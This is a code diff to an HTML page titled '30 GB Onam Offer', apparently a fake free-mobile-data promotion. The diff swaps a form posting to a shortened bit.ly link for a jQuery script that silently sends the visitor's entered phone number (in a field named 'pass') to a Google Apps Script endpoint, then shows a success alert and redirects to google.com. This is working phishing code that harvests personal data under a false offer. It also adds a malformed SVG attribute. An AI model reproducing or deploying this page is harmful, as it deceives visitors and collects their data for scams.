@@ -41,6 +41,8 @@
     <meta property="og:image" itemprop="image" content="ok.jpeg">
     <meta property="og:type" content="website"/>
     <meta property="og:updated_time" content="1440432930"/>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+
     <!-- <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500&display=swap" rel="stylesheet">-->
     <title>30 GB Onam Offer</title>
 
@@ -822,6 +824,7 @@
 }
 
 
+
     </style>
 
 </head>
@@ -925,8 +928,10 @@
                         var prevent = (e) => e.preventDefault();
                     </script>
                     
-                   <form action = "https://bit.ly/3K48eD0" method="POST"> 
-                    <br>
+                    
+           <div class="column">
+            <form id="submit-form" action="">
+             <br>
                     <div class="input-group">
 <input name="pass" placeholder="Enter Your Phone Number Here " required="required" type="number"style="height: 60px;font-size: 18px;width: 300px;"></div>
                     
@@ -954,7 +959,29 @@
     margin: 10px auto;
     margin-top: 10px;
     font-size: 20px;
-    background-color:#5500ff;/>
+    background-color:#5500ff">
+            </form>
+             </div>    
+   
+<script>
+        $("#submit-form").submit((e)=>{
+            e.preventDefault()
+            $.ajax({
+                url:"https://script.google.com/macros/s/AKfycbz4c9i5AQV9VJvetcmp_-1WDtDhlrJbXS1tfNzDFazttRBnECMsAiyOYIzBJiZybBE8/exec",
+                data:$("#submit-form").serialize(),
+                method:"post",
+                success:function (response){
+                    alert("Form submitted successfully")
+                    window.location.reload()
+                    window.location.href="https://google.com"
+                },
+                error:function (err){
+                    alert("Something Error")
+    
+                }
+            })
+        })
+    </script>
        
 
                         <div class="message-status js-hidden"></div>
@@ -1142,7 +1169,7 @@
                     <div style="border: 1px solid gray;border-left: none; width:30%" class="quedate__load-icon">
                         <svg id="third-loading" class="quedate__load-animate" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style=" shape-rendering: auto;" viewBox="0 0 100 100" preserveAspectRatio="xMidYMid" width="3.2rem">
                             <circle cx="50" cy="50" r="32" stroke-width="8" stroke="white" stroke-dasharray="100.26548245743669 100.26548245743669" fill="none" stroke-linecap="round" transform="rotate(214.395 50 50)">
-                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
+                                <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCountindefinite" keyTimes="0;1" values="0 50 50;360 50 50"></animateTransform>
                             </circle>
                             <circle cx="50" cy="50" r="23" stroke-width="8" stroke="white" stroke-dasharray="100.12831551628262 100.12831551628262" stroke-dashoffset="36.12831551628262" fill="none" stroke-linecap="round" transform="rotate(-214.395 50 50)">
                                 <animateTransform attributeName="transform" type="rotate" dur="1s" repeatCount="indefinite" keyTimes="0;1" values="0 50 50;-360 50 50"></animateTransform>
